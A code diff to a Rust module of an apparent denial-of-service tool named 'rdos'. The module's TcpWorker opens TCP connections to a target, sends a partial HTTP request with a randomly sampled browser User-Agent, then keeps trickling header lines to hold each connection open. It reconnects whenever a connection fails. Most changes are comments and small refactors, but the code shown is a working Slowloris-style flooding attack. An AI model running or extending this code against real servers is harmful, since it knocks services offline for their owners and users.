@@ -3,9 +3,7 @@ use std::{io::Write, net::TcpStream, thread, time};
 
 use crate::ipv4_spec::IPv4Spec;
 
-#[derive(Debug)]
-struct ConnectionError;
-
+// When a connection is initialized, the TcpWorker will sample a random user agent header.
 const USER_AGENTS: [&'static str; 25] =  ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
@@ -40,6 +38,9 @@ pub struct TcpWorker {
 
 impl TcpWorker {
     pub fn new(ip_address: IPv4Spec, payload_size: usize) -> Result<TcpWorker, std::io::Error> {
+        // Only if TcpWorker::init() fails here in TcpWorker::new() it should panic rdos.
+        // This means that you propably can't connect because you can't reach the target IP and port.
+        // On TcpWorker.restart() rdos should not panic because are just recreating a previously succesful connection.
         let tcp = TcpWorker::init(ip_address)?;
 
         return Ok(TcpWorker {
@@ -50,12 +51,15 @@ impl TcpWorker {
     }
 
     fn init(ip_address: IPv4Spec) -> std::io::Result<TcpStream> {
+        // TcpStream::connect() is the only valid way to construct TcpStream
+        // There is no TcpStream::new(). This is why I created the reusable TcpWorker::init() method.
         let mut stream = TcpStream::connect(format!(
             "{}:{}",
             ip_address.get_host(),
             ip_address.get_port()
         ))?;
 
+        // Write initial bytes to TcpStream
         _ = stream.write(
             format!("GET / HTTP/1.1 \
                 Host: localhost \
@@ -70,7 +74,7 @@ impl TcpWorker {
                 Sec-Fetch-User: ?1 \
                 Sec-Fetch-Dest: document \
                 Accept-Encoding: gzip, deflate, br \
-                ", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())]).as_bytes()
+                ", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())]).as_bytes() // Random sampling of User-Agent header
         );
 
         return Ok(stream);
@@ -90,18 +94,22 @@ impl TcpWorker {
 
     pub fn work(&mut self) {
         let payload = format!(
-            "X-HTTP-Header: {}",
+            "X-HTTP-Header: {}\n",
             TcpWorker::generate_payload(self.payload_size)
         );
 
         let result = self.tcp_client.write(payload.as_bytes());
 
         match result {
-            // Ok(s) => println!("Sent: {}", payload),
-            Ok(_) => {}
+            Ok(_) => {
+                // On success do nothing.
+                // println!("{}", some message?);
+            }
             _ => {
+                // On failure we want to set the internal worker status as finished.
+                // The next cycle detects that the worker has stopped and will TcpWorker.restart() the TcpStream.
                 println!("Failed to send payload");
-                self.set_finished(true)
+                self.is_finished = true;
             }
         }
     }
@@ -117,11 +125,7 @@ impl TcpWorker {
         thread::sleep(duration);
     }
 
-    pub fn is_finished(&self) -> bool {
+    pub fn finished(&self) -> bool {
         return self.is_finished;
-    }
-
-    pub fn set_finished(&mut self, is_finished: bool) {
-        self.is_finished = is_finished;
     }
 }
